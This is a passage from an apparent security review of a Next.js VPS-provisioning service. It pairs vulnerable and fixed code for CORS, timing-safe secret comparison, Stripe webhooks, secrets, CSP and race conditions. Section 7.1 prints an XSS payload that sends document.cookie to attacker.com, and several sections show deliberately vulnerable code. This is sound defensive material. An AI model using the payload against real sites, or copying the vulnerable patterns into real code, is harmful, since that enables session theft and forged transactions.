    throw new ApiError(413, 'Request body too large.');
  }

  const body = await req.text();

  if (body.length > MAX_BODY_SIZE) {
    throw new ApiError(413, 'Request body too large.');
  }

  try {
    return JSON.parse(body) as T;
  } catch {
    throw new ApiError(400, 'Invalid JSON in request body.');
  }
}
```

---

### 4.3 CORS Configuration

**Severity: Medium**

Vercel's default CORS is permissive. Configure explicitly in `next.config.js`:

```typescript
// next.config.js
const nextConfig = {
  async headers() {
    return [
      {
        source: '/api/:path*',
        headers: [
          { key: 'Access-Control-Allow-Origin', value: 'https://runclaw.io' },
          { key: 'Access-Control-Allow-Methods', value: 'GET, POST, DELETE, OPTIONS' },
          { key: 'Access-Control-Allow-Headers', value: 'Content-Type, Authorization' },
          { key: 'Access-Control-Max-Age', value: '86400' },
          { key: 'Access-Control-Allow-Credentials', value: 'true' },
        ],
      },
    ];
  },
};
```

Never use `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true`.

---

### 4.4 Content-Type Validation

**Severity: Low**

**FIXED pattern -- reject unexpected content types:**

```typescript
// lib/validate-content-type.ts
export function requireJsonContentType(req: NextRequest): void {
  const contentType = req.headers.get('content-type');
  if (!contentType?.includes('application/json')) {
    throw new ApiError(415, 'Content-Type must be application/json.');
  }
}
```

---

### 4.5 Error Message Information Disclosure

**Severity: Medium**

**VULNERABLE pattern -- leaking stack traces:**

```typescript
// app/api/instances/route.ts
export async function POST(req: NextRequest) {
  try {
    // ... provisioning logic
  } catch (err) {
    return NextResponse.json({
      error: err.message,           // may contain internal details
      stack: err.stack,             // full stack trace with file paths
      hetznerResponse: err.response, // raw API response with credentials
    }, { status: 500 });
  }
}
```

**FIXED pattern -- generic errors in production, detailed logging server-side:**

```typescript
// lib/api-error-handler.ts
export function handleApiError(err: unknown): NextResponse {
  const errorId = crypto.randomUUID();

  // Log full details server-side (Vercel logs / observability)
  console.error(JSON.stringify({
    errorId,
    message: err instanceof Error ? err.message : String(err),
    stack: err instanceof Error ? err.stack : undefined,
    timestamp: new Date().toISOString(),
  }));

  // Return generic message to client
  if (err instanceof ApiError) {
    return NextResponse.json(
      { error: err.publicMessage, errorId },
      { status: err.statusCode }
    );
  }

  return NextResponse.json(
    { error: 'An internal error occurred.', errorId },
    { status: 500 }
  );
}

export class ApiError extends Error {
  constructor(
    public statusCode: number,
    public publicMessage: string,
    internalMessage?: string
  ) {
    super(internalMessage ?? publicMessage);
  }
}
```

---

### 4.6 Timing Attack on callback_secret Verification

**Severity: High**

The callback endpoint receives a `secret` parameter to authenticate that the callback is from a legitimately provisioned instance. If this secret is compared with `===`, the comparison short-circuits on the first mismatched byte, leaking timing information.

**VULNERABLE pattern:**

```typescript
// app/api/callbacks/provision-complete/route.ts
export async function POST(req: NextRequest) {
  const { subdomain, secret, status } = await req.json();

  const instance = await databases.listDocuments(DB, INSTANCES_COL, [
    Query.equal('subdomain', subdomain),
    Query.limit(1),
  ]);

  if (instance.documents[0].callback_secret !== secret) {
    //                                       ^^^
    // String comparison short-circuits: attacker can guess the secret
    // one byte at a time by measuring response latency.
    return NextResponse.json({ error: 'Invalid secret' }, { status: 403 });
  }

  // Process callback...
}
```

**Attack scenario:**
1. Attacker knows a victim's subdomain (visible in DNS).
2. Attacker sends callback requests with different `secret` values.
3. By measuring response time (typically needing many samples), the attacker determines how many leading bytes match.
4. After ~32 iterations (one per byte of the secret), the attacker reconstructs the full secret.
5. With the valid secret, the attacker can mark the instance as "ready" or "failed", disrupting the provisioning flow.

**FIXED pattern -- constant-time comparison:**

```typescript
// app/api/callbacks/provision-complete/route.ts
import { timingSafeEqual } from 'node:crypto';

function secureCompare(a: string, b: string): boolean {
  if (a.length !== b.length) {
    // Compare against a dummy to avoid leaking length difference
    // through an early return with no comparison at all
    const dummy = Buffer.alloc(a.length);
    timingSafeEqual(Buffer.from(a), dummy);
    return false;
  }
  return timingSafeEqual(Buffer.from(a), Buffer.from(b));
}

export async function POST(req: NextRequest) {
  const { subdomain, secret, status } = await req.json();

  if (typeof secret !== 'string' || secret.length === 0) {
    return NextResponse.json({ error: 'Invalid request' }, { status: 400 });
  }

  const results = await databases.listDocuments(DB, INSTANCES_COL, [
    Query.equal('subdomain', subdomain),
    Query.limit(1),
  ]);

  if (results.total === 0) {
    return NextResponse.json({ error: 'Not found' }, { status: 404 });
  }

  const instance = results.documents[0];

  if (!secureCompare(instance.callback_secret, secret)) {
    return NextResponse.json({ error: 'Invalid request' }, { status: 403 });
  }

  // Process callback...
}
```

---

## 5. Webhook Security (Stripe)

### 5.1 Stripe Signature Verification

**Severity: Critical**

Stripe sends a `Stripe-Signature` header that must be verified against the raw request body. This is the primary defense against forged webhook events.

**VULNERABLE pattern -- no signature verification:**

```typescript
// app/api/webhooks/stripe/route.ts
export async function POST(req: NextRequest) {
  const event = await req.json();

  // CRITICAL: No signature verification.
  // Anyone can send forged events to this endpoint.
  if (event.type === 'checkout.session.completed') {
    await provisionInstance(event.data.object);
  }

  return NextResponse.json({ received: true });
}
```

**Attack scenario:**
1. Attacker discovers the webhook URL (often guessable: `/api/webhooks/stripe`).
2. Attacker sends a forged `checkout.session.completed` event with their own customer data.
3. The system provisions a VPS instance without any actual payment.

**FIXED pattern -- full signature verification with raw body:**

```typescript
// app/api/webhooks/stripe/route.ts
import Stripe from 'stripe';

const stripe = new Stripe(process.env.STRIPE_SECRET_KEY!, {
  apiVersion: '2024-06-20',
});

const WEBHOOK_SECRET = process.env.STRIPE_WEBHOOK_SECRET!;

export async function POST(req: NextRequest) {
  // Step 1: Get the raw body as text (NOT parsed JSON)
  const rawBody = await req.text();

  // Step 2: Get the signature header
  const signature = req.headers.get('stripe-signature');
  if (!signature) {
    return NextResponse.json({ error: 'Missing signature' }, { status: 400 });
  }

  // Step 3: Verify the signature
  let event: Stripe.Event;
  try {
    event = stripe.webhooks.constructEvent(rawBody, signature, WEBHOOK_SECRET);
  } catch (err) {
    console.error('Webhook signature verification failed:', err instanceof Error ? err.message : err);
    return NextResponse.json({ error: 'Invalid signature' }, { status: 400 });
  }

  // Step 4: Process the verified event
  switch (event.type) {
    case 'checkout.session.completed':
      await handleCheckoutCompleted(event.data.object as Stripe.Checkout.Session);
      break;
    case 'customer.subscription.deleted':
      await handleSubscriptionDeleted(event.data.object as Stripe.Subscription);
      break;
    default:
      console.log(`Unhandled event type: ${event.type}`);
  }

  return NextResponse.json({ received: true });
}
```

---

### 5.2 Raw Body Parsing Requirement

**Severity: Critical**

Next.js App Router (route handlers) provides `req.text()` and `req.json()`. If you call `req.json()` first, the body is parsed and the raw bytes are lost -- signature verification will always fail because Stripe signs the raw body.

**VULNERABLE pattern -- body already parsed:**

```typescript
// Calling .json() first destroys the raw body needed for signature verification
export async function POST(req: NextRequest) {
  const body = await req.json();           // parsed -- raw bytes gone
  const rawBody = JSON.stringify(body);     // re-serialized -- NOT identical to original
  const signature = req.headers.get('stripe-signature')!;

  // This will FAIL because JSON.stringify(JSON.parse(raw)) !== raw
  // (key ordering, whitespace differences)
  const event = stripe.webhooks.constructEvent(rawBody, signature, WEBHOOK_SECRET);
}
```

**FIXED**: Always use `req.text()` first, verify the signature, then parse:

```typescript
export async function POST(req: NextRequest) {
  const rawBody = await req.text();  // preserve raw bytes
  // ... verify signature with rawBody ...
  const event = stripe.webhooks.constructEvent(rawBody, signature, WEBHOOK_SECRET);
  // event is already parsed by constructEvent -- no need for JSON.parse
}
```

**Next.js App Router config** -- disable body parsing is not needed in the App Router (it is only relevant in Pages API routes). In Pages API routes, you would need:

```typescript
// pages/api/webhooks/stripe.ts (Pages Router only)
export const config = {
  api: { bodyParser: false },
};
```

---

### 5.3 Replay Attack Prevention

**Severity: Medium**

Stripe includes a timestamp in the signature header. Verify that the event is recent (within 5 minutes) to prevent replay attacks.

**FIXED pattern -- Stripe SDK handles this by default:**

```typescript
// The Stripe SDK's constructEvent already checks the timestamp tolerance.
// Default tolerance is 300 seconds (5 minutes).
// You can make it stricter:
const event = stripe.webhooks.constructEvent(rawBody, signature, WEBHOOK_SECRET, 300);
//                                                          tolerance in seconds ^^^
```

If you implement manual verification (not recommended), always check:

```typescript
const signatureParts = signature.split(',');
const timestamp = parseInt(
  signatureParts.find(p => p.startsWith('t='))?.split('=')[1] ?? '0',
  10
);
const tolerance = 300; // seconds
const now = Math.floor(Date.now() / 1000);

if (Math.abs(now - timestamp) > tolerance) {
  return NextResponse.json({ error: 'Event too old or too new' }, { status: 400 });
}
```

---

### 5.4 Webhook Idempotency

**Severity: Medium**

Stripe may deliver the same event multiple times. Processing a `checkout.session.completed` event twice could provision two VPS instances for one payment.

**VULNERABLE pattern -- no idempotency check:**

```typescript
async function handleCheckoutCompleted(session: Stripe.Checkout.Session) {
  // Provisions a new instance every time this is called
  await createInstance(session.metadata!.subdomain, session.customer as string);
}
```

**FIXED pattern -- idempotency via event ID deduplication:**

```typescript
// lib/webhook-idempotency.ts
const PROCESSED_EVENTS_COL = 'processed_webhook_events';

export async function isEventProcessed(eventId: string): Promise<boolean> {
  const results = await databases.listDocuments(DB, PROCESSED_EVENTS_COL, [
    Query.equal('event_id', eventId),
    Query.limit(1),
  ]);
  return results.total > 0;
}

export async function markEventProcessed(eventId: string): Promise<void> {
  await databases.createDocument(DB, PROCESSED_EVENTS_COL, 'unique()', {
    event_id: eventId,
    processed_at: new Date().toISOString(),
  });
}

// app/api/webhooks/stripe/route.ts
async function handleCheckoutCompleted(
  event: Stripe.Event,
  session: Stripe.Checkout.Session
) {
  // Check idempotency
  if (await isEventProcessed(event.id)) {
    console.log(`Event ${event.id} already processed, skipping.`);
    return;
  }

  // Process the event
  await createInstance(session.metadata!.subdomain, session.customer as string);

  // Mark as processed
  await markEventProcessed(event.id);
}
```

---

### 5.5 Webhook Event Ordering

**Severity: Low**

Stripe does not guarantee event delivery order. A `customer.subscription.updated` event may arrive before `checkout.session.completed`. Design the handler to be order-independent:

- Use the event's `created` timestamp to detect out-of-order updates.
- Store a `last_event_timestamp` on the instance document and reject older events.
- For status transitions, define a valid state machine and reject invalid transitions.

```typescript
const VALID_TRANSITIONS: Record<string, string[]> = {
  provisioning: ['ready', 'failed'],
  ready: ['suspending', 'deleting'],
  suspending: ['suspended', 'failed'],
  suspended: ['restoring', 'deleting'],
  restoring: ['ready', 'failed'],
  deleting: ['deleted', 'failed'],
  failed: ['provisioning', 'deleting'],
};

function isValidTransition(from: string, to: string): boolean {
  return VALID_TRANSITIONS[from]?.includes(to) ?? false;
}
```

---

### 5.6 Webhook Endpoint IP Restriction

**Severity: Low**

For additional defense-in-depth, restrict the webhook endpoint to Stripe's IP ranges. Stripe publishes their IP list at https://stripe.com/docs/ips.

**FIXED pattern -- IP allowlist in middleware:**

```typescript
// Stripe webhook IPs (check Stripe docs for current list)
const STRIPE_IP_RANGES = [
  '3.18.12.63',
  '3.130.192.231',
  '13.235.14.237',
  '13.235.122.149',
  '18.211.135.69',
  '35.154.171.200',
  '52.15.183.38',
  '54.88.130.119',
  '54.88.130.237',
  '54.187.174.169',
  '54.187.205.235',
  '54.187.216.72',
];

export function isStripeIp(ip: string): boolean {
  return STRIPE_IP_RANGES.includes(ip);
}
```

**Note**: IP allowlisting is defense-in-depth only. The signature verification in section 5.1 is the primary security control. Stripe's IP list can change, so this should log warnings rather than hard-block.

---

## 6. Secrets Management

### 6.1 Environment Variable Security on Vercel

**Severity: High**

**Required environment variables and their sensitivity:**

| Variable | Sensitivity | Notes |
|----------|------------|-------|
| `STRIPE_SECRET_KEY` | Critical | Can charge customers, issue refunds |
| `STRIPE_WEBHOOK_SECRET` | Critical | Forged webhooks if leaked |
| `HETZNER_API_TOKEN` | Critical | Can create/destroy servers, read all server data |
| `CLOUDFLARE_API_TOKEN` | High | Can modify DNS records |
| `APPWRITE_API_KEY` | Critical | Full database access (depends on scope) |
| `APPWRITE_PROJECT_ID` | Low | Public in client-side SDK config |
| `APPWRITE_ENDPOINT` | Low | Public |
| `NEXT_PUBLIC_*` | Low | Intentionally public |

**Security checklist:**
- [ ] All sensitive variables are set as "Sensitive" in Vercel (encrypted at rest, masked in logs).
- [ ] No `NEXT_PUBLIC_` prefix on sensitive variables (this makes them available in client-side bundles).
- [ ] Different values per environment (Production, Preview, Development).
- [ ] Preview deployments do NOT have production Stripe/Hetzner keys (use test keys).
- [ ] Vercel project settings have "Deployment Protection" enabled to prevent access to preview deployments by unauthorized parties.

---

### 6.2 Callback Secret Generation

**Severity: High**

The callback secret authenticates provision-complete callbacks from the VPS back to the RunClaw API. It must be cryptographically random.

**VULNERABLE pattern -- predictable secret:**

```typescript
// NEVER use Math.random() for secrets
const callbackSecret = Math.random().toString(36).substring(2);
// Or UUIDs, which are not designed for security
const callbackSecret = crypto.randomUUID(); // v4 UUID has only 122 bits of randomness
                                             // and a predictable format
```

**FIXED pattern -- CSPRNG with sufficient entropy:**

```typescript
import { randomBytes } from 'node:crypto';

function generateCallbackSecret(): string {
  // 32 bytes = 256 bits of entropy, hex-encoded
  return randomBytes(32).toString('hex');
}
```

**Verification**: `crypto.randomBytes()` in Node.js uses the OS CSPRNG (`/dev/urandom` on Linux, `BCryptGenRandom` on Windows). This is suitable for security-sensitive secret generation.

---

### 6.3 API Key Rotation Strategy

**Severity: High**

| Service | Rotation Frequency | Procedure |
|---------|--------------------|-----------|
| Hetzner API Token | Every 90 days | Generate new token in Hetzner Console, update Vercel env, redeploy, delete old token |
| Cloudflare API Token | Every 90 days | Generate new scoped token, update Vercel env, redeploy, delete old token |
| Stripe Secret Key | On suspected compromise | Roll key in Stripe Dashboard (can maintain two active keys during migration) |
| Stripe Webhook Secret | When rolling endpoint | Delete old endpoint, create new one with new secret |
| Appwrite API Key | Every 90 days | Generate new key with same scopes, update Vercel env, redeploy, delete old key |

**Rotation automation script (conceptual):**

```typescript
// scripts/rotate-keys.ts
// This is a checklist generator, not an automated tool
// Automated key rotation requires careful orchestration to avoid downtime

async function printRotationChecklist(service: string) {
  console.log(`Key Rotation Checklist for ${service}:`);
  console.log('1. Generate new key/token in the service console');
  console.log('2. Update the environment variable in Vercel');
  console.log('3. Trigger a production redeployment');
  console.log('4. Verify the new deployment works (health check)');
  console.log('5. Delete the old key/token from the service console');
  console.log('6. Record the rotation date in the security log');
}
```

---

### 6.4 Secret Scanning in CI/CD

**Severity: Medium**

**Required checks:**
1. **Pre-commit hook**: Use `gitleaks` or `trufflehog` to scan staged files for secrets before they enter the repository.
2. **CI pipeline**: Run secret scanning on every PR.
3. **GitHub**: Enable GitHub's built-in secret scanning and push protection.

```yaml
# .github/workflows/secret-scan.yml
name: Secret Scanning
on: [pull_request]

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - uses: gitleaks/gitleaks-action@v2
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

---

### 6.5 .env File Protection

**Severity: Medium**

```gitignore
# .gitignore
.env
.env.local
.env.*.local
.env.production
.env.development
```

Additionally, verify that `.env` files are never served by Next.js. The framework does not serve dotfiles by default, but verify with:

```bash
curl -I https://runclaw.io/.env
# Should return 404, not 200
```

---

## 7. Client-Side Security

### 7.1 XSS Prevention

**Severity: High**

React auto-escapes JSX expressions by default. The primary risk areas are:

**VULNERABLE pattern -- dangerouslySetInnerHTML with user content:**

```tsx
// components/InstanceDetails.tsx
function InstanceDetails({ instance }: { instance: Instance }) {
  return (
    <div>
      <h2>{instance.subdomain}.runclaw.io</h2>
      {/* VULNERABLE: status_message comes from the callback, which is
          ultimately controlled by code running on the VPS */}
      <div dangerouslySetInnerHTML={{ __html: instance.status_message }} />
    </div>
  );
}
```

**Attack scenario:**
1. Attacker provisions an instance.
2. Attacker modifies their VPS to send a callback with `status_message` set to `<img src=x onerror="document.location='https://attacker.com/steal?c='+document.cookie">`.
3. When any admin views the instance in the dashboard, the XSS fires and steals their session cookie.

**FIXED pattern -- never use dangerouslySetInnerHTML with external data:**

```tsx
// components/InstanceDetails.tsx
function InstanceDetails({ instance }: { instance: Instance }) {
  return (
    <div>
      <h2>{instance.subdomain}.runclaw.io</h2>
      {/* React auto-escapes this -- safe */}
      <p>{instance.status_message}</p>
    </div>
  );
}
```

If HTML rendering is absolutely required, use a sanitization library:

```typescript
import DOMPurify from 'isomorphic-dompurify';

const cleanHtml = DOMPurify.sanitize(instance.status_message, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'code'],
  ALLOWED_ATTR: [],
});
```

---

### 7.2 CSRF Protection

**Severity: Medium**

With `SameSite=Strict` cookies, CSRF attacks via cross-site form submissions are blocked because the browser will not send the cookie on cross-origin requests. However:

- Verify that all state-changing operations use POST/DELETE (not GET).
- Verify that the API checks the `Origin` header matches the expected domain.
- Appwrite's own cookies include CSRF protection.

**Defense-in-depth: Origin header check:**

```typescript
// middleware.ts (add to existing middleware)
const ALLOWED_ORIGINS = new Set([
  'https://runclaw.io',
  'https://www.runclaw.io',
]);

if (['POST', 'PUT', 'DELETE', 'PATCH'].includes(req.method)) {
  const origin = req.headers.get('origin');
  if (origin && !ALLOWED_ORIGINS.has(origin)) {
    return NextResponse.json({ error: 'Forbidden' }, { status: 403 });
  }
}
```

---

### 7.3 Content Security Policy Headers

**Severity: Medium**

**FIXED pattern -- CSP headers in next.config.js:**

```typescript
// next.config.js
const ContentSecurityPolicy = [
  "default-src 'self'",
  "script-src 'self' 'unsafe-inline' 'unsafe-eval' https://js.stripe.com",
  "style-src 'self' 'unsafe-inline'",
  "img-src 'self' data: https:",
  "font-src 'self'",
  "connect-src 'self' https://cloud.appwrite.io https://api.stripe.com",
  "frame-src https://js.stripe.com https://hooks.stripe.com",
  "base-uri 'self'",
  "form-action 'self'",
  "frame-ancestors 'none'",
  "upgrade-insecure-requests",
].join('; ');

const securityHeaders = [
  { key: 'Content-Security-Policy', value: ContentSecurityPolicy },
  { key: 'X-Frame-Options', value: 'DENY' },
  { key: 'X-Content-Type-Options', value: 'nosniff' },
  { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
  { key: 'Permissions-Policy', value: 'camera=(), microphone=(), geolocation=()' },
  { key: 'Strict-Transport-Security', value: 'max-age=63072000; includeSubDomains; preload' },
];

const nextConfig = {
  async headers() {
    return [
      {
        source: '/(.*)',
        headers: securityHeaders,
      },
    ];
  },
};
```

**Note**: `unsafe-inline` and `unsafe-eval` for scripts are required by Next.js in development. In production, use nonce-based CSP if possible. Stripe.js requires its domain in `script-src` and `frame-src`.

---

### 7.4 Subresource Integrity for CDN Assets

**Severity: Low**

If loading any scripts from CDNs (unlikely with Next.js bundling, but possible for Stripe.js), use SRI:

```html
<script
  src="https://js.stripe.com/v3/"
  integrity="sha384-EXPECTED_HASH_HERE"
  crossorigin="anonymous"
></script>
```

**Note**: Stripe.js does not support SRI because they update the script without changing the URL. Rely on CSP `script-src` restrictions instead.

---

### 7.5 Local Storage vs Cookie Security for Tokens

**Severity: Medium**

| Storage | XSS Accessible | CSRF Risk | Recommendation |
|---------|---------------|-----------|----------------|
| `localStorage` | Yes -- any XSS can read it | No | Do not use for session tokens |
| `sessionStorage` | Yes -- any XSS can read it | No | Do not use for session tokens |
| `HttpOnly` cookie | No -- invisible to JS | Yes (mitigated by SameSite) | Recommended |

**Rule**: Store session tokens exclusively in `HttpOnly`, `Secure`, `SameSite=Strict` cookies. Never store tokens in `localStorage` or `sessionStorage`.

Appwrite's client SDK stores the session in a cookie by default when configured correctly. Verify the Appwrite client initialization does not override this to use `localStorage`:

```typescript
// lib/appwrite-client.ts
import { Client, Account } from 'appwrite';

const client = new Client()
  .setEndpoint(process.env.NEXT_PUBLIC_APPWRITE_ENDPOINT!)
  .setProject(process.env.NEXT_PUBLIC_APPWRITE_PROJECT_ID!);

// Do NOT do this:
// client.setSession(localStorage.getItem('session'));

export const account = new Account(client);
```

---

## 8. Race Conditions

### 8.1 Double-Create Instance (Subdomain Uniqueness TOCTOU)

**Severity: High**

TOCTOU (Time-of-Check-to-Time-of-Use) vulnerability: the code checks if a subdomain is available, then creates the instance. Between the check and the create, another request can claim the same subdomain.

**VULNERABLE pattern -- check-then-act without atomicity:**

```typescript
// app/api/instances/route.ts
export async function POST(req: NextRequest) {
  const { subdomain } = await req.json();

  // Step 1: Check if subdomain is available
  const existing = await databases.listDocuments(DB, INSTANCES_COL, [
    Query.equal('subdomain', subdomain),
    Query.limit(1),
  ]);

  if (existing.total > 0) {
    return NextResponse.json({ error: 'Subdomain taken' }, { status: 409 });
  }

  // *** RACE WINDOW ***
  // Between the check above and the create below, another request
  // can also pass the check and create a document with the same subdomain.
  // Both requests proceed to provision a Hetzner server.

  // Step 2: Create the instance document
  const instance = await databases.createDocument(DB, INSTANCES_COL, 'unique()', {
    user_id: user.$id,
    subdomain,
    status: 'provisioning',
  });

  // Step 3: Provision Hetzner server
  await provisionServer(instance);

  return NextResponse.json(instance, { status: 201 });
}
```

**Attack scenario:**
1. Attacker sends two simultaneous `POST /api/instances` requests with the same subdomain.
2. Both requests pass the uniqueness check (the first document has not been created yet).
3. Both requests create documents and provision Hetzner servers.
4. Two servers are created for one subdomain, causing DNS conflicts, billing issues, and potential data exposure.

**FIXED pattern -- database-level unique constraint + retry:**

```typescript
// Step 1: Create a unique index on the 'subdomain' field in Appwrite.
// This is done in the Appwrite Console or via the API:
//
// await databases.createIndex(DB, INSTANCES_COL, 'unique_subdomain', 'unique', ['subdomain']);

// Step 2: Use try/catch on the create operation
export async function POST(req: NextRequest) {
  const { account, databases } = createSessionClient(req);

  let user;
  try {
    user = await account.get();
  } catch {
    return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
  }

  const { subdomain } = await req.json();

  const validation = validateSubdomain(subdomain);
  if (!validation.valid) {
    return NextResponse.json({ error: validation.error }, { status: 400 });
  }

  // Attempt to create -- the unique index enforces atomicity
  let instance;
  try {
    instance = await databases.createDocument(
      DB,
      INSTANCES_COL,
      'unique()',
      {
        user_id: user.$id,
        subdomain: validation.subdomain,
        status: 'provisioning',
        callback_secret: generateCallbackSecret(),
      },
      [
        Permission.read(Role.user(user.$id)),
        Permission.update(Role.user(user.$id)),
        Permission.delete(Role.user(user.$id)),
      ]
    );
  } catch (err: unknown) {
    // Appwrite throws a 409 conflict if the unique index is violated
    if (err instanceof AppwriteException && err.code === 409) {
      return NextResponse.json(
        { error: 'This subdomain is already taken.' },
        { status: 409 }
      );
    }
    throw err; // re-throw unexpected errors
  }

  // Only provision AFTER the database document is successfully created
  try {
    await provisionServer(instance);
  } catch (err) {
    // If provisioning fails, clean up the database entry
    await databases.deleteDocument(DB, INSTANCES_COL, instance.$id);
    throw err;
  }

  return NextResponse.json(instance, { status: 201 });
}
```

**Key insight**: The unique index on `subdomain` turns the race condition into a database constraint violation. Only one of the concurrent requests will succeed in creating the document; the other will receive a 409 error.

---

### 8.2 Double-Delete Instance

**Severity: Medium**

If two delete requests arrive simultaneously, the second may fail when trying to delete an already-deleted Hetzner server, or worse, both may partially complete leaving orphaned resources.

**VULNERABLE pattern:**

```typescript
export async function DELETE(req: NextRequest, { params }: { params: { instanceId: string } }) {
  const instance = await getOwnedInstance(req, params.instanceId);

  // Request 1: starts deleting Hetzner server
  // Request 2: also reads the instance (still exists) and starts deleting
  await hetznerClient.servers.del(instance.hetzner_server_id);
  await cloudflareClient.dns.records.delete(instance.dns_record_id, { zone_id: CF_ZONE_ID });
  await databases.deleteDocument(DB, INSTANCES_COL, instance.$id);
}
```

**FIXED pattern -- optimistic locking via status field:**

```typescript
export async function DELETE(req: NextRequest, { params }: { params: { instanceId: string } }) {
  const { account, databases } = createSessionClient(req);

  let user;
  try {
    user = await account.get();
  } catch {
    return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
  }

  // Step 1: Atomically transition status to 'deleting'
  // Only proceed if the current status allows deletion
  const results = await databases.listDocuments(DB, INSTANCES_COL, [
    Query.equal('$id', params.instanceId),
    Query.equal('user_id', user.$id),
    Query.notEqual('status', 'deleting'), // skip if already being deleted
    Query.notEqual('status', 'deleted'),
    Query.limit(1),
  ]);

  if (results.total === 0) {
    return NextResponse.json(
      { error: 'Instance not found or already being deleted.' },
      { status: 404 }
    );
  }

  const instance = results.documents[0];

  // Step 2: Mark as deleting BEFORE starting destructive operations
  try {
    await databases.updateDocument(DB, INSTANCES_COL, instance.$id, {
      status: 'deleting',
    });
  } catch {
    // Another request won the race -- this is fine
    return NextResponse.json(
      { error: 'Instance is already being deleted.' },
      { status: 409 }
    );
  }

  // Step 3: Proceed with deletion (only one request reaches here)
  try {
    await hetznerClient.servers.del(instance.hetzner_server_id);
  } catch (err: unknown) {
    // Hetzner returns 404 if server already deleted -- that's acceptable
    if (!(err instanceof Error && 'status' in err && (err as any).status === 404)) {
      // Revert status on unexpected error
      await databases.updateDocument(DB, INSTANCES_COL, instance.$id, {
        status: 'failed',
        status_message: 'Deletion failed. Please retry.',
      });
      throw err;
    }
  }

  try {
    await cloudflareClient.dns.records.delete(instance.dns_record_id, {
      zone_id: CF_ZONE_ID,
    });
  } catch {
    // DNS record may already be deleted -- log but continue
    console.warn(`DNS record ${instance.dns_record_id} deletion failed, may already be removed.`);
  }

  await databases.updateDocument(DB, INSTANCES_COL, instance.$id, {
    status: 'deleted',
  });

  return NextResponse.json({ success: true });
}
```

---

### 8.3 Webhook Processing Race Conditions

**Severity: Medium**

Stripe may send multiple webhook events that update the same instance (e.g., `invoice.paid` and `customer.subscription.updated` arriving simultaneously). Concurrent updates to the same document can cause lost updates.

**VULNERABLE pattern:**

```typescript
async function handleInvoicePaid(invoice: Stripe.Invoice) {
  const instance = await getInstanceByCustomerId(invoice.customer as string);
  // Both handlers read the same document state
  await databases.updateDocument(DB, INSTANCES_COL, instance.$id, {
    last_payment_at: new Date().toISOString(),
    status: 'active',
  });
}

async function handleSubscriptionUpdated(subscription: Stripe.Subscription) {
  const instance = await getInstanceByCustomerId(subscription.customer as string);
  // This update overwrites the update from handleInvoicePaid
  await databases.updateDocument(DB, INSTANCES_COL, instance.$id, {
    plan: subscription.items.data[0].price.id,
    status: subscription.status === 'active' ? 'active' : 'suspended',
  });
}
```

**FIXED pattern -- update only the relevant fields, use Appwrite's built-in conflict handling:**

```typescript
async function handleInvoicePaid(invoice: Stripe.Invoice) {
  const instance = await getInstanceByCustomerId(invoice.customer as string);
  // Only update payment-related fields
  await databases.updateDocument(DB, INSTANCES_COL, instance.$id, {
    last_payment_at: new Date().toISOString(),
  });
}

async function handleSubscriptionUpdated(subscription: Stripe.Subscription) {
  const instance = await getInstanceByCustomerId(subscription.customer as string);
  // Only update subscription-related fields
  await databases.updateDocument(DB, INSTANCES_COL, instance.$id, {
    plan: subscription.items.data[0].price.id,
    subscription_status: subscription.status,
  });
}
```

For operations that must be serialized, use a queue (e.g., Vercel KV-based queue, QStash, or Inngest):

```typescript
// lib/webhook-queue.ts
import { Client } from '@upstash/qstash';

const qstash = new Client({ token: process.env.QSTASH_TOKEN! });

export async function enqueueWebhookEvent(event: Stripe.Event) {
  await qstash.publishJSON({
    url: `${process.env.NEXT_PUBLIC_URL}/api/webhooks/process`,
    body: { eventId: event.id, type: event.type },
    deduplicationId: event.id, // prevents duplicate processing
  });
}
```

---

### 8.4 Concurrent Health Check Updates

**Severity: Low**

If health checks run on a schedule and two invocations overlap, they may write conflicting statuses for the same instance.

**FIXED pattern -- last-write-wins with timestamp:**

```typescript
async function updateHealthStatus(
  instanceId: string,
  healthy: boolean,
  checkedAt: Date
) {
  const instance = await databases.getDocument(DB, INSTANCES_COL, instanceId);

  // Only update if our check is newer
  const lastCheck = instance.last_health_check_at
    ? new Date(instance.last_health_check_at)
    : new Date(0);

  if (checkedAt <= lastCheck) {
    // Our check is stale -- skip
    return;
  }

  await databases.updateDocument(DB, INSTANCES_COL, instanceId, {
    health_status: healthy ? 'healthy' : 'unhealthy',
    last_health_check_at: checkedAt.toISOString(),
  });
}
```

---

## Severity Summary

| # | Vulnerability | Severity | Section |
|---|---------------|----------|---------|
| 1 | IDOR on instance endpoints (missing ownership check) | **Critical** | 2.1 |
| 2 | Broken access control on instance deletion | **Critical** | 2.2 |
| 3 | Cloud-init template injection via subdomain | **Critical** | 3.2 |
| 4 | Missing Stripe webhook signature verification | **Critical** | 5.1 |
| 5 | Raw body parsing breaks Stripe signature | **Critical** | 5.2 |
| 6 | Session cookie misconfiguration | **High** | 1.2 |
| 7 | No brute force protection on login | **High** | 1.4 |
| 8 | Appwrite permission misconfiguration | **High** | 2.3 |
| 9 | API key over-privilege | **High** | 2.5 |
| 10 | Subdomain validation bypass | **High** (enables Critical 3.2) | 3.1 |
| 11 | Timing attack on callback_secret | **High** | 4.6 |
| 12 | Rate limiting absent | **High** | 4.1 |
| 13 | Environment variable exposure | **High** | 6.1 |
| 14 | Weak callback secret generation | **High** | 6.2 |
| 15 | TOCTOU on subdomain uniqueness | **High** | 8.1 |
| 16 | Trusting client-supplied user ID | **High** | 1.1 |
| 17 | Session timeout and rotation missing | **Medium** | 1.3 |
| 18 | Account lockout absent | **Medium** | 1.5 |
| 19 | Account enumeration via error messages | **Medium** | 1.8 |
| 20 | JSON injection in document fields | **Medium** | 3.3 |
| 21 | Header injection via subdomain | **Medium** | 3.4 |
| 22 | Error message information disclosure | **Medium** | 4.5 |
| 23 | Webhook replay attacks | **Medium** | 5.3 |
| 24 | Webhook idempotency missing | **Medium** | 5.4 |
| 25 | Double-delete race condition | **Medium** | 8.2 |
| 26 | Webhook processing race conditions | **Medium** | 8.3 |
| 27 | XSS via dangerouslySetInnerHTML | **Medium** (context-dependent) | 7.1 |
| 28 | MFA not enforced | **Medium** | 1.6 |
| 29 | Password policy gaps | **Medium** | 1.7 |
| 30 | Request size limits absent | **Medium** | 4.2 |
